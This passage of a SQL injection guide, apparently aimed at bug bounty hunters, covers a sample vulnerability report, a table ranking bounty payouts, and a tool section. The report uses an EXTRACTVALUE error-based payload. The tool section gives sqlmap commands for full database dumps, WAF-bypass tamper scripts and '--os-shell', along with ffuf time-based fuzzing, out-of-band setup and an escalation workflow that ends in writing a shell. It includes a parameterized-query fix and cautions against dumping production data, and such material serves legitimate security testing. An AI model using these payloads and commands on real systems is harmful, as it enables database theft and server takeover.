### Reproduction Steps (exact, copy-pasteable)
1. Navigate to: https://target.com/api/products?id=1
2. Modify the `id` parameter to:
   `1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))--+-`
3. Observe error response containing MySQL version string

### Evidence
**Request:**
\`\`\`http
GET /api/products?id=1+AND+EXTRACTVALUE... HTTP/1.1
Host: target.com
\`\`\`

**Response (redacted):**
\`\`\`
XPATH syntax error: '~8.0.32-MySQL Community Server~'
\`\`\`

### Impact
- Database version/engine exposed
- Confirm: all table names extractable via [payload]
- Confirm: credentials table accessible (did NOT dump — stopped after confirming existence)
- Potential for full database read, write, possibly OS-level access

### Suggested Fix
Use parameterized queries / prepared statements. Replace:
\`\`\`python
cursor.execute(f"SELECT * FROM products WHERE id={id}")
\`\`\`
With:
\`\`\`python
cursor.execute("SELECT * FROM products WHERE id=%s", (id,))
\`\`\`
```

### 15.2 What Separates High Bounty from Low Bounty

| What you show                          | Bounty impact      |
|----------------------------------------|--------------------|
| Just error message                     | Low (informational)|
| DB version extracted                   | Medium             |
| Table names enumerated                 | Medium-High        |
| Demonstrated credential column exists  | High               |
| Actual data extracted (1 row, proof)   | Critical           |
| RCE via xp_cmdshell / COPY TO PROGRAM | Critical Max       |
| Chained with auth bypass               | Bonus              |

**Critical rule:** Extract **proof**, not production data. Show one password hash exists. Do NOT dump the whole database. Most programs explicitly forbid it and will reduce/void the bounty.

---

## 16. Tool Stack & Automation

### 16.1 sqlmap — The Standard

```bash
# Basic test:
sqlmap -u "http://target.com/item?id=1" --dbs

# With headers (for auth):
sqlmap -u "http://target.com/item?id=1" \
  --headers="Authorization: Bearer TOKEN" \
  --cookie="session=COOKIE"

# POST body:
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  -p username

# JSON body:
sqlmap -u "http://target.com/api/user" \
  --data='{"id": 1}' \
  --content-type="application/json"

# Tamper scripts for WAF bypass:
sqlmap -u "..." --tamper=space2comment,between,randomcase

# Full extraction (authorized):
sqlmap -u "..." --dump --threads=10 --level=5 --risk=3

# Specific table:
sqlmap -u "..." -D database_name -T users --dump

# OS shell attempt:
sqlmap -u "..." --os-shell
```

### 16.2 Key Tamper Scripts for WAF

```bash
# Common effective combinations:
--tamper=space2comment          # spaces → /**/
--tamper=between                # > → BETWEEN, = → BETWEEN
--tamper=randomcase             # rAndOM caSE
--tamper=charencode             # URL encodes chars
--tamper=chardoubleencode       # double URL encode
--tamper=equaltolike            # = → LIKE
--tamper=greatest               # > → GREATEST()
--tamper=hex2char               # strings → CHAR()
--tamper=modsecurityversioned   # versioned comment /*!50000...*/
--tamper=versionedmorekeywords  # keywords in /*!...*/

# Stack multiple:
--tamper=space2comment,randomcase,charencode
```

### 16.3 Manual Testing Tools

```bash
# Burp Suite Pro — essential
# - Intruder for payload fuzzing
# - Repeater for manual testing
# - Scanner for automated discovery
# - Collaborator for OOB

# ghauri — modern sqlmap alternative:
pip install ghauri
ghauri -u "http://target.com/item?id=1" --dbs

# NoSQLMap — for hybrid/NoSQL:
python nosqlmap.py

# Havij-alternative — Bright Security, Invicti (commercial)

# interactsh — self-hosted OOB server:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client  # gives you: xxxxxxx.oast.pro
```

### 16.4 Custom Wordlists for Parameter Fuzzing

```bash
# SecLists — best public wordlist collection:
# /Discovery/Web-Content/burp-parameter-names.txt
# /Fuzzing/SQLi/quick-SQLi.txt
# /Fuzzing/SQLi/Generic-SQLi.txt

# Generate custom list for time-based:
python3 -c "
payloads = [
  \"1 AND SLEEP(3)\",
  \"1' AND SLEEP(3)-- -\",
  \"1\\\" AND SLEEP(3)-- -\",
  \"') AND SLEEP(3)-- -\",
  \"1; SELECT SLEEP(3)-- -\",
]
for p in payloads: print(p)
" > time_based.txt

# Use ffuf for param fuzzing:
ffuf -w time_based.txt:PAYLOAD \
  -u "http://target.com/item?id=PAYLOAD" \
  -fr "normal_response_keyword" \
  -t 1  # 1 thread for time-based
```

---

## Quick Reference Cheat Sheet

### Injection Testing Workflow

```
1. MAP      → Find all input surfaces (URL, headers, body, cookies)
2. BASELINE → Record normal behavior (time, length, status)
3. CONTEXT  → Identify SQL context (string/int/ORDER BY/INSERT)
4. CONFIRM  → Trigger error or behavioral change with delimiter
5. ENGINE   → Fingerprint database (MySQL/PG/MSSQL/Oracle)
6. EXTRACT  → Choose method: error-based → blind → time → OOB
7. ESCALATE → Read files, write shell, execute commands (if in scope)
8. REPORT   → Proof-of-concept, impact, remediation
```

### Error Detection One-Liners

```
'              → unterminated string
''             → escaped quote (no error if handled)
\              → backslash injection test (MySQL)
1/0            → arithmetic error
SLEEP(0)       → confirm MySQL
pg_sleep(0)    → confirm PostgreSQL
WAITFOR DELAY '0:0:0' → confirm MSSQL
1=1            → tautology (no visible effect alone)
1=0            → contradiction (no visible effect alone)
1 AND 1=1      → boolean true (compare to 1 AND 1=0)
```

---
